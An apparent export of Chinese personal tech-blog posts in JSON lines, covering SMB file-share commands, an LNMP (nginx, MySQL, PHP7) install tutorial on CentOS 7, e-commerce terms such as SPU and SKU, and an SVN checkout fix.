BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">smbget -Rr smb://ip_addr/share like wget can download files from a host windows via smb</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share mount a windows network share</p>                                    </div>", "log_PostTime": 1584891035, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "LNMP环境搭建", "log_Intro": "LNMP环境搭建", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">虚拟机，官方网站下载centos 7 DVD-iOS安装<br>系统：centos 7<br>网络配置完成<br>通过ssh工具访问服务器IP地址，端口22<br>输入账号，密码</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">开始配置环境，参考文档https://www.linuxidc.com/Linux/2016-09/134907.htm<br><a href=\"https://www.cnblogs.com/pangguoming/p/8261491.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);\">https://www.cnblogs.com/pangguoming/p/8261491.html</a><br>1.检查并安装所需的依赖软件<br>　1).gcc:nginx编译依赖gcc环境<br>　　　安装命令：yum install gcc-c++<br>　2).pcre:(Perl Compatible Regular Expressions)是一个Perl库，包括 perl 兼容的正则表达式库。nginx的http模块使用pcre来解析正则表达式.<br>　　　安装命令：yum install -y pcre pcre-devel<br>　3).zlib：该库提供了很多种压缩和解压缩的方式，nginx使用zlib对http包的内容进行gzip。<br>　　　安装命令：yum install -y zlib zlib-devel<br>　4).openssl:一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。nginx不仅支持http协议，还支持https（即在ssl协议上传输http）.<br>　　　安装命令：yum install -y openssl openssl-devel</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">2.下载nginx源码包<br>　下载命令：wget <a href=\"http://nginx.org/download/nginx-1.12.0.tar.gz\" rel=\"nofollow\" style=\"color:rgb(65,131,196);\">http://nginx.org/download/nginx-1.12.0.tar.gz</a><br>在没有进入任何目录情况下，默认下载到ROOT文件夹下，使用FTP工具访问服务器可以看到</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">3.解压缩源码包并进入<br>　1).解压缩：tar -zxvf nginx-1.12.0.tar.gz<br>　2).进入解压缩后文件夹：cd nginx-1.12.0<br>4.配置编译参数命令:)<br>./configure</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">不指定目录，默认文件路径为/usr/local/nginx<br>注：安装之前需要手动创建上面指定的nginx文件夹，即/var/temp、/var/temp/nginx、/var/run/nginx/文件夹，否则启动时报错<br>5.编译并安装<br>　　命令：make &amp;&amp; make install<br>　　可以进入/usr/local/nginx查看文件是否存在conf、sbin、html文件夹，若存在则安装成功<br><img alt=\"\" src=\"https://box.kancloud.cn/c8b555c1e7149b5200bd99ba3d2a6f3c_479x286.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">安装完成开始使用nginx<br>1.启动nginx<br>1).进入安装目录<br>　　　cd /usr/local/nginx/sbin/<br>2).启动<br>　　　./nginx</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">输入服务器IP地址测试<br><img alt=\"\" src=\"https://box.kancloud.cn/98b42a15b6624dabb1fafdbb38ec4818_663x274.png\" style=\"border:0px none;vertical-align:top;\"><br>如果失败，可以 关闭防火墙命令再试试 systemctl stop firewalld.service</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">三、安装MySQL5.7.*<br>1.安装mysql源<br>yum localinstall <a href=\"http://dev.mysql.com/get/mysql57-community-release-el7-7.noarch.rpm\" rel=\"nofollow\" style=\"color:rgb(65,131,196);\">http://dev.mysql.com/get/mysql57-community-release-el7-7.noarch.rpm</a><br>2.安装mysql<br>yum install mysql-community-server<br>3.安装mysql的开发包，以后会有用<br>yum install mysql-community-devel<br>4.启动mysql<br>service mysqld start<br>Redirecting to /bin/systemctl start mysqld.service<br><img alt=\"\" src=\"https://box.kancloud.cn/e395c7deca9b466ca728d7df7ae0424c_684x268.png\" style=\"border:0px none;vertical-align:top;\"><br>5.查看mysql启动状态<br>service mysqld status<br><img alt=\"\" src=\"https://box.kancloud.cn/c932203924df92b54daf4c015731b078_671x240.png\" style=\"border:0px none;vertical-align:top;\"><br>出现pid<br>证明启动成功<br>6.获取mysql默认生成的密码<br>grep 'temporary password' /var/log/mysqld.log<br><img alt=\"\" src=\"https://box.kancloud.cn/b3f8874e01488e9631ed3efea8eb55c9_681x61.png\" style=\"border:0px none;vertical-align:top;\"><br>选中的就是密码。<br>7.换成自己的密码<br>mysql -uroot -p<br>Enter password:输入上页的密码，右键复制粘贴下来就可以了，进入mysql<br>8. 更换密码<br>ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyNewPasdfs4!';<br><img alt=\"\" src=\"https://box.kancloud.cn/00742c4715d1089109c0388b3e2e3f03_679x134.png\" style=\"border:0px none;vertical-align:top;\"><br>这个密码一定要足够复杂，不然会不让你改，提示密码不合法;大小写加数字加符号<br>9.退出mysql并试用下新密码，命令quit;<br>mysql&gt; quit;</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">再连接测试下密码<br>mysql -uroot -p<br>确认密码正确</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">四、编译安装php7.0.0<br>1.下载php7源码包<br>cd /root &amp; wget -O php7.tar.gz <a href=\"http://cn2.php.net/get/php-7.0.1.tar.gz/from/this/mirror\" rel=\"nofollow\" style=\"color:rgb(65,131,196);\">http://cn2.php.net/get/php-7.0.1.tar.gz/from/this/mirror</a><br>2.解压源码包<br>tar -xvf php7.tar.gz<br>3.进入目录<br>cd php-7.0.1<br>4.安装php依赖包</span></p><h1 class=\"line\" style=\"font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;line-height:1.2;font-weight:200;color:rgba(0,0,0,.870588);\"><span style=\"font-size:16px;\"><span><a style=\"color:rgb(65,131,196);\"></a></span>yum install libxml2 libxml2-devel openssl openssl-devel bzip2 bzip2-devel libcurl libcurl-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel gmp gmp-devel libmcrypt libmcrypt-devel readline readline-devel libxslt libxslt-devel</span></h1><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"></p><p><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/de66ef1a079485667062e82065d09e4d_668x306.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p><span style=\"font-size:16px;\"></span></p><pre class=\"best-text mb-10\" style=\"font-family:'PingFang SC', 'Lantinghei SC', 'Microsoft YaHei', arial, '宋体', sans-serif, tahoma;font-size:16px;line-height:29px;color:rgb(51,51,51);min-height:55px;\"><strong>yum -y install gcc</strong>  （2018-04-21 更新 以下编译配置不断出现报错,经大量测试,发现没有安装gcc编译器）</pre><span style=\"font-size:16px;\">5.编译配置，这里如果上一步的某些依赖包没有安装好，就会遇到很多configure error，我们一一解决，安装上相关软件开发包就可以，把以下整段复制编译，目录到/usr/local/php，</span><pre><code class=\"language-html\">./configure \\\n--prefix=/usr/local/php \\\n--with-config-file-path=/etc \\\n--enable-fpm \\\n--with-fpm-user=nginx  \\\n--with-fpm-group=nginx \\\n--enable-inline-optimization \\\n--disable-debug \\\n--disable-rpath \\\n--enable-shared  \\\n--enable-soap \\\n--with-libxml-dir \\\n--with-xmlrpc \\\n--with-openssl \\\n--with-mcrypt \\\n--with-mhash \\\n--with-pcre-regex \\\n--with-sqlite3 \\\n--with-zlib \\\n--enable-bcmath \\\n--with-iconv \\\n--with-bz2 \\\n--enable-calendar \\\n--with-curl \\\n--with-cdb \\\n--enable-dom \\\n--enable-exif \\\n--enable-fileinfo \\\n--enable-filter \\\n--with-pcre-dir \\\n--enable-ftp \\\n--with-gd \\\n--with-openssl-dir \\\n--with-jpeg-dir \\\n--with-png-dir \\\n--with-zlib-dir  \\\n--with-freetype-dir \\\n--enable-gd-native-ttf \\\n--enable-gd-jis-conv \\\n--with-gettext \\\n--with-gmp \\\n--with-mhash \\\n--enable-json \\\n--enable-mbstring \\\n--enable-mbregex \\\n--enable-mbregex-backtrack \\\n--with-libmbfl \\\n--with-onig \\\n--enable-pdo \\\n--with-mysqli=mysqlnd \\\n--with-pdo-mysql=mysqlnd \\\n--with-zlib-dir \\\n--with-pdo-sqlite \\\n--with-readline \\\n--enable-session \\\n--enable-shmop \\\n--enable-simplexml \\\n--enable-sockets  \\\n--enable-sysvmsg \\\n--enable-sysvsem \\\n--enable-sysvshm \\\n--enable-wddx \\\n--with-libxml-dir \\\n--with-xsl \\\n--enable-zip \\\n--enable-mysqlnd-compression-support \\\n--with-pear \\\n--enable-opcache</code></pre><br><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">编译过程中我这里报错是有 configure: error: mcrypt.h not found. Please reinstall libmcrypt.<br><img alt=\"\" src=\"https://box.kancloud.cn/99f190d74409794beb50a101c9d16e37_625x176.png\" style=\"border:0px none;vertical-align:top;\"><br>图中可以看到yum安装提示没有安装包可以安装，通过wget下载一个也失败了，网上有个方法可行<br>解决php编译报错configure: error: mcrypt.h not found. Please reinstall libmcrypt.<br>原创 2017年07月14日 15:31:11<br>yum install -y epel-release<br>yum install -y libmcrypt-devel<br>两个不能一起安装,因为CentOs6默认的yum源没有 libmcrypt-devel这个包,只能借助epel的yum源,所以先安装epel,再安装<br>libmcrypt。</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">这个方法测试再7版本是可行的，安装成功后，我这里重新编译了一次./configure</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">6.编译并安装<br>命令：make &amp;&amp; make install<br>这里要make好久，要耐心一下</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">7.添加 PHP 命令到环境变量<br>vim /etc/profile<br>在末尾加入<br>PATH=$PATH:/usr/local/php/bin<br>export PATH<br>要使改动立即生效执行<br>source /etc/profile<br>查看环境变量<br>echo $PATH<br>查看php版本<br>php -v<br><img alt=\"\" src=\"https://box.kancloud.cn/5d2df45b5786f0c8b0dd3791a69ec987_541x98.png\" style=\"border:0px none;vertical-align:top;\"><br>这时候，nginx还是不支持php的，它需要php-fpm来处理两者的依赖关系，现在问题来了，</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/735e54b39328f2c8e4ff93972d175afa_673x54.png\" style=\"border:0px none;vertical-align:top;\"><br>8.配置php-fpm</span></p><h6 style=\"font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;line-height:1.2;font-weight:200;color:rgba(0,0,0,.870588);\"><span style=\"font-size:16px;\">cp php.ini-production /etc/php.ini<br>cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf<br>cp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.conf<br>cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm<br>chmod +x /etc/init.d/php-fpm</span></h6><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">9.启动php-fpm<br>/etc/init.d/php-fpm start</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">接下来的步骤要是无法执行，请卸载了原来安装的nginx，使用yum重新安装一边<br>五、配置nginx虚拟机,绑定域名</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">vim /etc/nginx/conf.d/php7.aaa.com.conf<br>这里可以把php7.aaa.com.conf改成自己的域名<br>把下面的内容复制到php7.aaa.com.conf里</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">复制代码<br>server{<br>listen 80;<br>server_name <a href=\"http://php7.aaa.com/\" rel=\"nofollow\" style=\"color:rgb(65,131,196);\">php7.aaa.com</a>;<br>root /var/www/html/php7.aaa.com; # 该项要修改为你准备存放相关网页的路径<br>location / {<br>index index.php index.html index.htm;<br>#如果请求既不是一个文件，也不是一个目录，则执行一下重写规则<br>if (!-e $request_filename)<br>{<br>#地址作为将参数rewrite到index.php上。<br>rewrite ^/(.<span>)$ /index.php/$1;<br>#若是子目录则使用下面这句，将subdir改成目录名称即可。<br>#rewrite ^/subdir/(.</span>)$ /subdir/index.php/$1;<br>}<br>}<br>#proxy the php scripts to php-fpm<br>location ~ .php {<br>include fastcgi_params;<br>##pathinfo支持start<br>#定义变量 $path_info ，用于存放pathinfo信息<br>set $path_info \"\";<br>#定义变量 $real_script_name，用于存放真实地址<br>set $real_script_name $fastcgi_script_name;<br>#如果地址与引号内的正则表达式匹配<br>if ($fastcgi_script_name ~ \"^(.+?.php)(/.+)$\") {<br>#将文件地址赋值给变量 $real_script_name<br>set $real_script_name $1;<br>#将文件地址后的参数赋值给变量 $path_info<br>set $path_info $2;<br>}<br>#配置fastcgi的一些参数<br>fastcgi_param SCRIPT_FILENAME $document_root$real_script_name;<br>fastcgi_param SCRIPT_NAME $real_script_name;<br>fastcgi_param PATH_INFO $path_info;<br>###pathinfo支持end<br>fastcgi_intercept_errors on;<br>fastcgi_pass 127.0.0.1:9000;<br>}</span></p><pre style=\"font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace;line-height:1.45;border:0px;color:rgba(0,0,0,.870588);\"><code style=\"font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace;line-height:inherit;border:0px;\"><span style=\"font-size:16px;\">location ^~ /data/runtime {\nreturn 404;\n}\n\nlocation ^~ /application {\nreturn 404;\n}\n\nlocation ^~ /simplewind {\nreturn 404;\n}\n</span></code></pre><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">}<br>复制代码<br>2.重启nginx</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">service nginx reload<br>3.</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">vim /var/www/html/php7.aaa.com/index.php<br>把下面的代码复制到这个文件 里</span></p><p><span style=\"color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">php phpinfo(); </span></span></p><p><span style=\"color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;\"><span style=\"font-size:16px;\">4.查看访问http://php7.aaa.com ok!收工！</span></span></p>                                    </div>", "log_PostTime": 1584891038, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "什么是SPU、SKU、SKC、ARPU", "log_Intro": "什么是SPU、SKU、SKC、ARPU", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">首先，搞清楚商品与单品的区别。例如，iphone是一个单品，但是在淘宝上当很多商家同时出售这个产品的时候，iphone就是一个商品了。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">商品：淘宝叫item，京东叫product，商品特指与商家有关的商品，每个商品有一个商家编码，每个商品下面有多个颜色，款式，可以有多个SKU。</span></p><blockquote style=\"color:rgb(0,0,0);\"><p><span style=\"font-family:SimSun;font-size:16px;\">SPU = Standard Product Unit （标准化产品单元）</span></p></blockquote><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\"><strong>SPU</strong>是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。通俗点讲，属性值、特性相同的商品就可以称为一个SPU。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">例如，iphone4就是一个SPU，N97也是一个SPU，这个与商家无关，与颜色、款式、套餐也无关。以化妆品为例，下图是SPU信息：</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\"><img src=\"https://img-blog.csdn.net/20180416230426511\" alt=\"\"><br></span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">在商品信息电子化过程中，商品的特性可以由多个“属性及对应的属性值对”进行描述。“属性及对应的属性值对”完全相同的商品，可以抽象成为一个SPU。同 时，这些“属性及对应的属性值对”也在SPU中固化下来，逐步标准化。基于SPU的商品信息结构，可以实现丰富的应用，比如商品信息与资讯、评论、以及其 它SPU的整合。</span></p><p><span style=\"font-family:SimSun;font-size:16px;\"><span style=\"color:rgb(0,0,0);\">P.s：从这个意义上讲，我认为比较购物</span><span style=\"color:#000000;\">的产品库以SPU为标准来建立是最合适的。</span></span></p><blockquote style=\"color:rgb(0,0,0);\"><p><span style=\"font-family:SimSun;font-size:16px;\">SKU=stock keeping unit(库存量单位)</span></p></blockquote><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\"><strong>SKU</strong>即库存进出计量的单位， 可以是以件、盒、托盘等为单位。在服装、鞋类商品中使用最多最普遍。 例如纺织品中一个SKU通常表示：规格、颜色、款式。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">也有人说<strong>SKU</strong>就是库存的最小单位，在服装行业，正常情况是“单款单色单码”，国内品牌有把“单款单色”当做一个SKU、也有把“单款”的几个色当一个SKU、也有把一块面料的几个个款式当一个SKU,这些都是误读。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">同时，引申出另外一个概念：SKC：单款、单色。如果一定要打比方的话：SKC是一个桔子，SKU是一瓣桔子，但不管怎么说，一个桔子是桔子，一瓣桔子也是桔子。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">不过，SKU是物理上不可分割的最小存货单元。在使用时要根据不同业态，不同管 理模式来处理。比如一香烟是50条，一条里有十盒，一盒中有20支，这些单位就要根据不同的需要来设定SKU。比如仓储批发式大卖场，一定是按照一箱来设 定的。普通大卖场一定是按照条来设定的。烟酒专卖店一定是按照盒来设定的。过去上海等地的街边小店一定是按一支来设定的。这样一支就是烟的最小零售单位。 但要根据自己的业态和服务模式来设定。</span></p><p><span style=\"font-family:SimSun;font-size:16px;\"><span><span style=\"color:#000000;\"><span style=\"text-align:left;\"><strong>SKC：</strong>单款、单色</span><br style=\"text-align:left;\"><span style=\"text-align:left;\">1、SKC指单款单色，C是Color。</span><br style=\"text-align:left;\"><span style=\"text-align:left;\">2、SKC由来于服装行业进销存管理。早期做服装销售的公司IT水平低，上系统前由手工盘点和记录，每一款每一个颜色有多少就OK了，不记录尺码，因此单款单色就是最小库存管理单位。</span><br style=\"text-align:left;\"><span style=\"text-align:left;\">3、SKC在早期服装行业有一定的传播，范围有限。已不适应现在的精细管理需求，逐渐为SKU取代。</span></span></span><br></span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">P.s:关于什么是<strong>SKU</strong>,可以参考阿福先生的<a href=\"http://blog.sina.com.cn/s/blog_5795fbd00100dgp6.html\" rel=\"nofollow\" style=\"color:rgb(74,127,248);\">这篇博客</a>。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\">【总结一下】：<span style=\"color:rgb(255,0,0);\">SPU是标准化产品单元，区分品种；SKU是库存量单位，区分单品；商品特指与商家有关的商品，可对应多个SKU。</span></span></p><blockquote style=\"color:rgb(0,0,0);\"><p><span style=\"font-family:SimSun;font-size:16px;\">ARPU=Average Revenue Per User(每用户平均收入)</span></p></blockquote><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\"><strong>ARPU</strong>注重的是一个时间段内运营商从每个用户所得到的利润。因此，高端的用户越多，ARPU越高。在这个时间段里，从运营商的运营情况来看，ARPU值高说明利润高，这段时间效益好。</span></p><p style=\"color:rgb(0,0,0);\"><span style=\"font-family:SimSun;font-size:16px;\"><span>原文地址：</span><a href=\"http://www.ikent.me/blog/3017\" rel=\"nofollow\" style=\"color:rgb(12,137,207);\">http://www.ikent.me/blog/3017</a></span><br></p>                                    </div>", "log_PostTime": 1584891039, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "SVN无法CO检出web目录", "log_Intro": "SVN无法CO检出web目录", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">公司停电造成的SVN上传后有报错<br><img alt=\"\" src=\"https://box.kancloud.cn/34bfd65dd7baf0fa20e80d24bf376c13_676x490.png\" style=\"border:0px none;vertical-align:top;\"><br>post-commit用于同步web目录的配置文件<br>SVN设置了开机启动，所以客户端我们上传和更新文件正常，但是有如上的报错，<br>并且浏览器访问web站点没有新上传的项目内容。</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\"><strong>解决方法</strong><br>1.删除或者修改掉原来同步的项目文件夹<br><img alt=\"\" src=\"https://box.kancloud.cn/e512a8067c00831990bb058b2414def2_586x344.png\" style=\"border:0px none;vertical-align:top;\"></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">2.使用putty工具登录服务器，cd到项目路径下 cd /var/www</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">3.从svn库里检出svn文件库到www 目录 svn co svn://localhost/html</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.结果出现SVN报错No repository found in 'svn://localhost/html'<br>报这个错误原因是因为启动SVN服务时指定的仓库路径不对,把原来的进程kill掉，再重新指定正确的仓库根目录就行了。不用像网上一些说另外建立仓库指定那么麻烦，直接按照一些命令一步一步来就完事了</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.1.查SVN使用的3690端口监听的PID号，如下8236就是记住你查出来的<br>[root@xxxxxx~]# netstat -apn|grep 3690<br>tcp 0 0 0.0.0.0:3690 0.0.0.0:* LISTEN 8236/svnserve</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.2.[root@xxxxxx~]# ps -aux|grep 3690<br>Warning: bad syntax, perhaps a bogus '-'? See /usr/share/doc/procps-3.2.8/FAQ<br>root 8460 0.0 0.0 103256 840 pts/0 S+ 10:18 0:00 grep 3690</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.3.[root@xxxxxx~]# ps -aux|grep 8236<br>Warning: bad syntax, perhaps a bogus '-'? See /usr/share/doc/procps-3.2.8/FAQ<br>root 8236 0.0 0.0 156996 1012 ? Ss 09:52 0:00 /usr/bin/svnserve --daemon --pid-file=/var/run/svnserve.pid<br>root 8476 0.0 0.0 103256 840 pts/0 S+ 10:19 0:00 grep 8236</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.4.关闭PID 8236这个进程，这个PID是上面查3690端口查出来的，大家根据自己的改<br>[root@xxxxxx~]# kill -9 8236</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.5.[root@xxxxxx~]# ps aux|grep svnserve<br>root 8506 0.0 0.0 103256 840 pts/0 S+ 10:19 0:00 grep svnserve</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.6.[root@xxxxxx~]# svnserve -d -r /var/www/</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.7.[root@xxxxxx~]# ps aux|grep svnserve<br>root 8533 0.0 0.0 156996 756 ? Ss 10:20 0:00 svnserve -d -r /var/www/<br>root 8549 0.0 0.0 103256 840 pts/0 S+ 10:20 0:00 grep svnserve</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">5.完成后重新在WWW目录下检出html项目，记住别忘了 cd /var/www<br>svn co svn://localhost/html</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\"><img alt=\"\" src=\"https://box.kancloud.cn/7be31e8952e52c351534d73523c71f0c_464x426.png\" style=\"border:0px none;vertical-align:top;\"></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">6.检出成功后，再次将html里的所以文件属性改成apache权限，修改conf数据库访问路径，删除本不该上传同步出来的缓存目录Runtime。<br>更新和上传文件没有报错<br>访问也成功<br><img alt=\"\" src=\"https://box.kancloud.cn/7b9be5fd90f3625eb740fce2d285e43e_654x311.png\" style=\"border:0px none;vertical-align:top;\"></p>                                    </div>", "log_PostTime": 1584891040, "log_Meta": ""}
